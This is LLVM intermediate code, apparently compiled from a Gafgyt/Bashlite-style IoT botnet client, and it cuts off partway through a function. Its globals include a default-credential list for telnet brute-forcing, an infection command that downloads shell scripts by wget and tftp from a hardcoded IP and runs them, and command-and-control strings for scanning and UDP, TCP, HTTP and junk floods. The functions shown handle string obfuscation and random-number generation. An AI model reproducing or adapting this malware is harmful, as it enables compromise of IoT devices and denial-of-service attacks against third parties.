; ModuleID = 'host/ir_O0/L7.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i32, i16, i8* }
%struct.udphdr = type { %union.anon.2 }
%union.anon.2 = type { %struct.anon.3 }
%struct.anon.3 = type { i16, i16, i16, i16 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.anon.1 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.state_t = type { i32, i8 }
%struct.ifreq = type { %union.anon.6, %union.anon.7 }
%union.anon.6 = type { [16 x i8] }
%union.anon.7 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@encodes = global [87 x i8] c"<>@o$:,.l+*^?=)(|AB&%;D\22!wkUxzvutsrqp_nm-ihgfFCcba~K23456789eyd1XSNQWTZMIRHGVOYLjPJE/][", align 16
@decodes = global [87 x i8] c"0123456789abcdefghijklmnopqrstuvzywxABCDEFGHIJKLMNOPQRSTUVZYWX|:. !#-/;&*'\22\0A\0D\00>$%(),?=@", align 16
@commServer = global [1 x i8*] [i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@usernames = global [7 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0)], align 16
@.str.1 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.3 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.5 = private unnamed_addr constant [7 x i8] c"login\00\00", align 1
@.str.6 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@passwords = global [14 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.14, i32 0, i32 0)], align 16
@.str.7 = private unnamed_addr constant [6 x i8] c"toor\00\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"changeme\00\00", align 1
@.str.9 = private unnamed_addr constant [6 x i8] c"1234\00\00", align 1
@.str.10 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.11 = private unnamed_addr constant [8 x i8] c"123456\00\00", align 1
@.str.12 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.13 = private unnamed_addr constant [6 x i8] c"pass\00\00", align 1
@.str.14 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.88 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.15 = private unnamed_addr constant [9 x i8] c"buf: %s\0A\00", align 1
@fdopen_pids = internal global i32* null, align 8
@.str.16 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.17 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.18 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.19 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.20 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.21 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.22 = private unnamed_addr constant [10 x i8] c"recv: %s\0A\00", align 1
@.str.23 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@ipState = internal global [5 x i8] zeroinitializer, align 1
@.str.24 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.25 = private unnamed_addr constant [11 x i8] c"%d.%d.%d.0\00", align 1
@.str.26 = private unnamed_addr constant [6 x i8] c"ogin:\00", align 1
@.str.27 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.28 = private unnamed_addr constant [9 x i8] c"assword:\00", align 1
@.str.29 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.30 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.31 = private unnamed_addr constant [266 x i8] c"cd /tmp; wget http://212.59.241.174/bins.sh; chmod 777 bins.sh; sh bins.sh; busybox tftp 212.59.241.174 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 212.59.241.174; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh\0D\0A\00", align 1
@.str.32 = private unnamed_addr constant [50 x i8] c"/bin/busybox;echo -e '\5C147\5C141\5C171\5C146\5C147\5C164'\0D\0A\00", align 1
@.str.33 = private unnamed_addr constant [7 x i8] c"gayfgt\00", align 1
@.str.34 = private unnamed_addr constant [11 x i8] c"multi-call\00", align 1
@.str.35 = private unnamed_addr constant [16 x i8] c"REPORT %s:%s:%s\00", align 1
@.str.36 = private unnamed_addr constant [14 x i8] c"REPORT %s:%s:\00", align 1
@.str.37 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.38 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.39 = private unnamed_addr constant [18 x i8] c"wget -O /tmp/fff \00", align 1
@.str.40 = private unnamed_addr constant [14 x i8] c" > /dev/null \00", align 1
@.str.41 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.42 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.43 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.44 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.45 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.46 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.47 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.48 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.49 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.50 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.51 = private unnamed_addr constant [11 x i8] c"GETLOCALIP\00", align 1
@.str.52 = private unnamed_addr constant [10 x i8] c"My IP: %s\00", align 1
@.str.53 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.54 = private unnamed_addr constant [17 x i8] c"SCANNER ON | OFF\00", align 1
@.str.55 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.56 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.57 = private unnamed_addr constant [5 x i8] c"HOLD\00", align 1
@.str.58 = private unnamed_addr constant [36 x i8] c"HOLD Flooding %s:%d for %d seconds.\00", align 1
@.str.59 = private unnamed_addr constant [5 x i8] c"JUNK\00", align 1
@.str.60 = private unnamed_addr constant [36 x i8] c"JUNK Flooding %s:%d for %d seconds.\00", align 1
@.str.61 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.62 = private unnamed_addr constant [32 x i8] c"UDP Flooding %s for %d seconds.\00", align 1
@.str.63 = private unnamed_addr constant [35 x i8] c"UDP Flooding %s:%d for %d seconds.\00", align 1
@.str.64 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.65 = private unnamed_addr constant [33 x i8] c"HTTP Flooding %s for %d seconds.\00", align 1
@.str.66 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.67 = private unnamed_addr constant [32 x i8] c"TCP Flooding %s for %d seconds.\00", align 1
@.str.68 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.69 = private unnamed_addr constant [11 x i8] c"Killed %d.\00", align 1
@.str.70 = private unnamed_addr constant [13 x i8] c"None Killed.\00", align 1
@.str.71 = private unnamed_addr constant [10 x i8] c"LOLNOGTFO\00", align 1
@.str.72 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.73 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.74 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.75 = private unnamed_addr constant [7 x i8] c"GAYFGT\00", align 1
@.str.76 = private unnamed_addr constant [36 x i8] c"MAC: %02X:%02X:%02X:%02X:%02X:%02X\0A\00", align 1
@.str.77 = private unnamed_addr constant [13 x i8] c"fork failed\0A\00", align 1
@.str.78 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.79 = private unnamed_addr constant [22 x i8] c"Failed to connect...\0A\00", align 1
@.str.80 = private unnamed_addr constant [9 x i8] c"BUILD %s\00", align 1
@.str.81 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.82 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.83 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.84 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.85 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.86 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.87 = private unnamed_addr constant [24 x i8] c"Link closed by server.\0A\00", align 1

; Function Attrs: noinline nounwind uwtable
define i8* @encode(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca [512 x i8], align 16
  %7 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %3, align 4
  store i32 0, i32* %4, align 4
  %8 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %8, i8 0, i64 512, i32 16, i1 false)
  br label %9

; <label>:9:                                      ; preds = %47, %1
  %10 = load i32, i32* %3, align 4
  %11 = sext i32 %10 to i64
  %12 = load i8*, i8** %2, align 8
  %13 = call i64 @strlen(i8* %12) #10
  %14 = icmp ult i64 %11, %13
  br i1 %14, label %15, label %50

; <label>:15:                                     ; preds = %9
  store i32 0, i32* %5, align 4
  br label %16

; <label>:16:                                     ; preds = %44, %15
  %17 = load i32, i32* %5, align 4
  %18 = sext i32 %17 to i64
  %19 = icmp ule i64 %18, 87
  br i1 %19, label %20, label %47

; <label>:20:                                     ; preds = %16
  %21 = load i8*, i8** %2, align 8
  %22 = load i32, i32* %3, align 4
  %23 = sext i32 %22 to i64
  %24 = getelementptr inbounds i8, i8* %21, i64 %23
  %25 = load i8, i8* %24, align 1
  %26 = sext i8 %25 to i32
  %27 = load i32, i32* %5, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds [87 x i8], [87 x i8]* @decodes, i64 0, i64 %28
  %30 = load i8, i8* %29, align 1
  %31 = sext i8 %30 to i32
  %32 = icmp eq i32 %26, %31
  br i1 %32, label %33, label %43

; <label>:33:                                     ; preds = %20
  %34 = load i32, i32* %5, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [87 x i8], [87 x i8]* @encodes, i64 0, i64 %35
  %37 = load i8, i8* %36, align 1
  %38 = load i32, i32* %4, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 %39
  store i8 %37, i8* %40, align 1
  %41 = load i32, i32* %4, align 4
  %42 = add nsw i32 %41, 1
  store i32 %42, i32* %4, align 4
  br label %43

; <label>:43:                                     ; preds = %33, %20
  br label %44

; <label>:44:                                     ; preds = %43
  %45 = load i32, i32* %5, align 4
  %46 = add nsw i32 %45, 1
  store i32 %46, i32* %5, align 4
  br label %16

; <label>:47:                                     ; preds = %16
  %48 = load i32, i32* %3, align 4
  %49 = add nsw i32 %48, 1
  store i32 %49, i32* %3, align 4
  br label %9

; <label>:50:                                     ; preds = %9
  %51 = load i32, i32* %4, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 %52
  store i8 0, i8* %53, align 1
  %54 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i32 0, i32 0
  %55 = call noalias i8* @strdup(i8* %54) #4
  store i8* %55, i8** %7, align 8
  %56 = load i8*, i8** %7, align 8
  ret i8* %56
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #1

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #2

; Function Attrs: nounwind
declare noalias i8* @strdup(i8*) #3

; Function Attrs: noinline nounwind uwtable
define i8* @decode(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca [512 x i8], align 16
  %7 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %3, align 4
  store i32 0, i32* %4, align 4
  %8 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %8, i8 0, i64 512, i32 16, i1 false)
  br label %9

; <label>:9:                                      ; preds = %47, %1
  %10 = load i32, i32* %3, align 4
  %11 = sext i32 %10 to i64
  %12 = load i8*, i8** %2, align 8
  %13 = call i64 @strlen(i8* %12) #10
  %14 = icmp ult i64 %11, %13
  br i1 %14, label %15, label %50

; <label>:15:                                     ; preds = %9
  store i32 0, i32* %5, align 4
  br label %16

; <label>:16:                                     ; preds = %44, %15
  %17 = load i32, i32* %5, align 4
  %18 = sext i32 %17 to i64
  %19 = icmp ule i64 %18, 87
  br i1 %19, label %20, label %47

; <label>:20:                                     ; preds = %16
  %21 = load i8*, i8** %2, align 8
  %22 = load i32, i32* %3, align 4
  %23 = sext i32 %22 to i64
  %24 = getelementptr inbounds i8, i8* %21, i64 %23
  %25 = load i8, i8* %24, align 1
  %26 = sext i8 %25 to i32
  %27 = load i32, i32* %5, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds [87 x i8], [87 x i8]* @encodes, i64 0, i64 %28
  %30 = load i8, i8* %29, align 1
  %31 = sext i8 %30 to i32
  %32 = icmp eq i32 %26, %31
  br i1 %32, label %33, label %43

; <label>:33:                                     ; preds = %20
  %34 = load i32, i32* %5, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [87 x i8], [87 x i8]* @decodes, i64 0, i64 %35
  %37 = load i8, i8* %36, align 1
  %38 = load i32, i32* %4, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 %39
  store i8 %37, i8* %40, align 1
  %41 = load i32, i32* %4, align 4
  %42 = add nsw i32 %41, 1
  store i32 %42, i32* %4, align 4
  br label %43

; <label>:43:                                     ; preds = %33, %20
  br label %44

; <label>:44:                                     ; preds = %43
  %45 = load i32, i32* %5, align 4
  %46 = add nsw i32 %45, 1
  store i32 %46, i32* %5, align 4
  br label %16

; <label>:47:                                     ; preds = %16
  %48 = load i32, i32* %3, align 4
  %49 = add nsw i32 %48, 1
  store i32 %49, i32* %3, align 4
  br label %9

; <label>:50:                                     ; preds = %9
  %51 = load i32, i32* %4, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i64 0, i64 %52
  store i8 0, i8* %53, align 1
  %54 = getelementptr inbounds [512 x i8], [512 x i8]* %6, i32 0, i32 0
  %55 = call noalias i8* @strdup(i8* %54) #4
  store i8* %55, i8** %7, align 8
  %56 = load i8*, i8** %7, align 8
  ret i8* %56
}

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %10

; <label>:10:                                     ; preds = %31, %1
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  br i1 %12, label %13, label %34

; <label>:13:                                     ; preds = %10
  %14 = load i32, i32* %3, align 4
  %15 = sub nsw i32 %14, 3
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = load i32, i32* %3, align 4
  %20 = sub nsw i32 %19, 2
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = xor i32 %18, %23
  %25 = xor i32 %24, -1640531527
  %26 = load i32, i32* %3, align 4
  %27 = xor i32 %25, %26
  %28 = load i32, i32* %3, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %29
  store i32 %27, i32* %30, align 4
  br label %31

; <label>:31:                                     ; preds = %13
  %32 = load i32, i32* %3, align 4
  %33 = add nsw i32 %32, 1
  store i32 %33, i32* %3, align 4
  br label %10

; <label>:34:                                     ; preds = %10
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  %27 = load i32, i32* @c, align 4
  %28 = icmp ult i32 %26, %27
  br i1 %28, label %29, label %34

; <label>:29:                                     ; preds = %0
  %30 = load i32, i32* %3, align 4
  %31 = add i32 %30, 1
  store i32 %31, i32* %3, align 4
  %32 = load i32, i32* @c, align 4
  %33 = add i32 %32, 1
  store i32 %33, i32* @c, align 4
  br label %34

; <label>:34:                                     ; preds = %29, %0
  %35 = load i32, i32* %4, align 4
  %36 = load i32, i32* %3, align 4
  %37 = sub i32 %35, %36
  %38 = load i32, i32* @rand_cmwc.i, align 4
  %39 = zext i32 %38 to i64
  %40 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %39
  store i32 %37, i32* %40, align 4
  ret i32 %37
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #10
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10

; <label>:22:                                     ; preds = %10
  br label %23

; <label>:23:                                     ; preds = %38, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %24, %25
  br i1 %26, label %27, label %36

; <label>:27:                                     ; preds = %23
  %28 = load i8*, i8** %2, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = call i32 @isspace(i32 %33) #10
  %35 = icmp ne i32 %34, 0
  br label %36

; <label>:36:                                     ; preds = %27, %23
  %37 = phi i1 [ false, %23 ], [ %35, %27 ]
  br i1 %37, label %38, label %41

; <label>:38:                                     ; preds = %36
  %39 = load i32, i32* %5, align 4
  %40 = add nsw i32 %39, -1
  store i32 %40, i32* %5, align 4
  br label %23

; <label>:41:                                     ; preds = %36
  %42 = load i32, i32* %4, align 4
  store i32 %42, i32* %3, align 4
  br label %43

; <label>:43:                                     ; preds = %59, %41
  %44 = load i32, i32* %3, align 4
  %45 = load i32, i32* %5, align 4
  %46 = icmp sle i32 %44, %45
  br i1 %46, label %47, label %62

; <label>:47:                                     ; preds = %43
  %48 = load i8*, i8** %2, align 8
  %49 = load i32, i32* %3, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = load i8*, i8** %2, align 8
  %54 = load i32, i32* %3, align 4
  %55 = load i32, i32* %4, align 4
  %56 = sub nsw i32 %54, %55
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %53, i64 %57
  store i8 %52, i8* %58, align 1
  br label %59

; <label>:59:                                     ; preds = %47
  %60 = load i32, i32* %3, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %3, align 4
  br label %43

; <label>:62:                                     ; preds = %43
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = load i32, i32* %4, align 4
  %66 = sub nsw i32 %64, %65
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %63, i64 %67
  store i8 0, i8* %68, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #2

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #4

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
